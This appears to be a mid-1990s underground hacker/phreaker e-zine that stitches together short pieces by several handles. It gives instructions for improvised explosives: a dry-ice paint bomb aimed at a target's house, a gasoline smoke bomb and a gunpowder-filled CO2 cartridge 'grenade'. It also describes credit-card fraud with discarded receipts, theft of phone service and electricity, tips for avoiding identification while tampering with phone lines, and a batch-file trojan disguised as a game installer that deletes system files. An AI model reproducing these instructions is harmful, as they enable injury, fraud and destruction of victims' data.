  How to get 3 WaY for free--The easy way.

      By--Lord K

       Me and Brophy Proce were taking and he had found a way to get 3 way
       absolutely free!. I must give full credit to him ofcourse. It goes
       liek this:

	 U gotta have 2 lines with the 1st line jack and the 2nd line jack
	 close to each other. What u do is go get a portable thats on ur
	 first line. Then call soemone. When that person asnwers tell them
	 to hold on. Then go into the other room with the phone or WHEREVER
	 the 1st line and 2nd line jacks are and take a fone cord, plug
	 one end into the second line jack and the other end into the first
	 lien jack. If u did it right u will here a dialtone on ur phone quickly
	 dial the number of the third person and there u have it 3 WAY!. To
	 dissconect the third party: Take one end of the phone cord outta a jack.
	 to discontect them all un hook the jack and hang up the portable. It
	 works best with a portable BELIEVE ME!

	 A simple DIagram


	    the first line jack
						second line jack

		       Welcome to the 90'S
			By: Brophy Price


Here we are in 1996 (Happy New Year), realizing how many things have
changed since the good old days of H/P/V/A/C. Lamers are more abundant
ever, and yet HPVAC is still thriving with life. In my experiences
have'nt seen but a handful of the truely elite. Most of who claim to be hackers
are nothing bu the little shits with the proggies written by others, and most
experienced were not impresseive. And yet htis past year has proven to be
on of the best years in accompliments for many people, the compaines who never
expected to be hit git hi, the anarcy, the internet proved to be a 'scary place'  <snicker>
and on top of all that the Braves won The WOrld Series (ahhh soit WAS a conspiricy).
Now after a hell of a year in '95 could you possibly thing that 1996 would be ANYTHING

    An AOL Hack Break Through By: œord K

    U know I was fooling around one day outside of (name withheld)
    and I went to the dumpster. There was this bag a heavy bag, plastix
    but it jumped my curiosity so! i ripped it open and BY GOD I THOUGHT
    I HAD DIED AND GOEN TO HEAVEN. There in the bag were CREDIT RECITES!
    So therefor I simple made about 2 dozzen accounts on AOL. It was a dream
    come true. It seems stores put there recites in a sperate! trash bag
    so incase they need one they dont have to dig though grap to find it.
    Unfortunaly the check thingy dont werk anymore for thoses who havent
    been on lately i tried it. SRSS is beginning to take over the WAREz
    rooms in a press relaeas they released saturday the 6th of january'96

     " Srss plans on running any group of any sort out of the waresz rooms
      we plan to put mass people of out group in each room no matter the
      cost and take over"

      It is uncertin weather they will succeed or not. In other news the head
      of AOL said in a MASS E-Mail  that:

      " There is a new security feture. One is that when u sign on as
       a new user and are useing a credit card or check we must call you
       at the number that is on the actual credit card (ie. from the credit
       company). SO now when u sign on you will hae to wait 3-4 days to get
       a  call and when that call comes u will be needing to enter the last
       4 digits of your ss number."

       THIS TEARS IT!!! How in the hell will we ever get back on, this suxs
       like rotten meat. O  yeah hint: if ur in a warez room or obvious
       illegal room make the other person send u a sample of soemthing
       that is illegal (ie gifs, files anything) to prove that they are not
       tos. In all my travels I know AOL like the back of my leg so terefore
       a littel advice to help u along the way.



	AOHELL IS HERE

	  In a maessage intercepted AOH4BTA4.ZIP is in the world and the
	  new aohell 96 is out! get it while u can. What is AOHELL? if u
	  cant answer this then u aint no hacker. I migth as well
	  go ahead and explain it. AOHELL was orignally made by a guy
	  who got tired of paying 9.95 a month and other charges to use
	  this service. SO therefore he sat down one day and made a program
	  that would allow the beholder to create accnts at will, macros,
	  have chat anywhere even while u go through dos. This program
	  litterly a dream come true for most, but unfortunaly it is hard
	  to use it anymore.

How to make a Paint Bomb
By: The Mortician

 Ok first u get a can of paint, a gallon will do. Then u get a piece
of DRY ICE and a hammer. Then go up to your targets house, drop the
dry ice into the paint can, close the lid and hammer it on QUICKLY
and ring the doorbell and RUN LIKE HELL do this quickly because the
fry ice combusts and then it all explodes!

-------------
 HAZE, IS it real?


HaZe, what the hell is haze?. This is what I hear so many people say
when I ask them about haze. See its like this: One day I was talking
to this Hack Wanna B and he asked me do I know what HaZe was and I said
no so he said I must be the hack wanna b (yeah and i was the one who
taught him all he knows on phreaking). So I went in search. I talked to
him and asked him what it was, Chris's reply (his name was chris)
"" Haze is a terminal program that allows you to drop to another
computers dos without them knowing about it"
Bull, **** I said they dont have anything liek that. But he persist they
do. SO! now I am looking for anyone who knows any info about this haze deal
to email the magaazine as soon as u can.








-=[ Box of the Month ]=-
   === Chartreuse ===

	Have you ever wanted free power? With a Chartruese Box you can
get all the free electricity you want and the TelCo pays for it all!

There are different degrees of Chartreuse Box:
	1. A simple straight wire hook-up
	2. A striaght wire hook-up with a fuse (RECOMMENDED)
	3. A straight wire hook-up with a fuse and a Rheostat (Best)

The boxes are harder to make as the numbers progress but even a #3 is simple.

		      Parts List

	[1] Four prong to modular adapter
	[2] Low power broad range Rheostat **
	[3] wire (not too cheap)
	[4] Soidering Iron
	[5] 70vt. Fuse *
	[6] 1 SPST switch
	[7] box to put the fuse (and optional Rheostat) in *
		 ----------------------
	 *  Optional, only if making a #2 or #3 box
	 ** Optional, only if making a #3 box

1.      A straight wire hook-up is basically just hooking some eletrical wire
  to your modular to four-prong adapter and draining electricity off it into
  some appliance.

How to make a Smoke Bomb!


ingredents=

 4 Parts Sugar
 6 Parts Salt peter  ( sold has a salt substitute)
 1 shoestring
 GASOLINE!!!!!!

 Ok first soak the string in some gasoline.
 Then the sugar and salt in a pan or soemthign u can use to cook it in
 then put it over a LOW! flame. Then when it starts to turn into a mold
 stick one end of the shoestring in the mold (to act as a fuse)
 then light it!.
 The bigger the mold THE MORE THE SMOKE!



 ---------------------

 Here are soem tips for Phreakers at there first time.

 1st when going out Beige Boxing where something dark! like
 Army Camoflauge, or anything that will make u blend in with the
 night. For one thign a good phreaker all! ways! go's! out! at! NIGHT!!!.
 The best times to go is between 12:00am and 3:00am and do it on weekdays
 because people arent up at thoses times. If u do it on weekends
 make sure no one is home first. Now for your equiptment.

 Screwdrive - Phillips and a Flat Head
 Knife      - Nothing too! dangerous no Army Knife just a pocket knife.
 Gloves     - The Good gloves like u would wear for Pistol Shooting
	      or if it is a COLD DAY. and make sure there BLACK OR DARK!
 A Mask     - A light one, one that u can take off quickly, and stuff in
	      your pocket.
 A Beige Box- this is the best thing to use when phreaking

 A flash Light.

 Binocluars - You made need to make sure no one is around.


 Also dont carry ANY ID! NO NO NO NO NO! Never carry anything! that can
idenify you.

Now in the mall or at a phone booth:

 Where a Jacket a good one with pockets

  You will need:

   Knife
   Micro Casset Recorder
   2 Quarters
   2 nickles

   Ok if u know how to use it all good but thats a run down of what u will
   need.




   ----------
   Co2 Bomb

     Ok go out an by one of them Co2 Cartiges that go in BB gunsl. Punch
     it open or use it one or the other. Once all the Co2 is out take
     a good size nail that is a bit biger than the hole. Now hammer it in there
     (this is to make the hole bigger). Now take soem gun powder
     (empty a few shotgun shells) and start putting it in the cartige.
     Tap the bottom of it CAREFULLY on something hard to pack it down. Now
     stick a fuse in it. Now if u want u can light it, throw it, and RUN!!!!!!!
     RUN!!!!!!!!!!!!!!!!!!!!!!!!!!!!RUN!!!!!!!!!!!!!!RUN!!!!!!!!!!!!!!!!!!!!!!
     This thing is like a Grenade! well have Phun......

 A trojan is a simple virus. It is composed of a bunch of dos commands.
Here is a simple trojan:

@ECHO OFF
ECHO.

ECHO PlEaSe WaIt wHiLe gAmE FiLeZ aRe CoPiEd!!
ECHO.
CD \
DIR /S *.COM  > LOLO.DAT
ECHO Y | DELTREE /Y C:\DOS
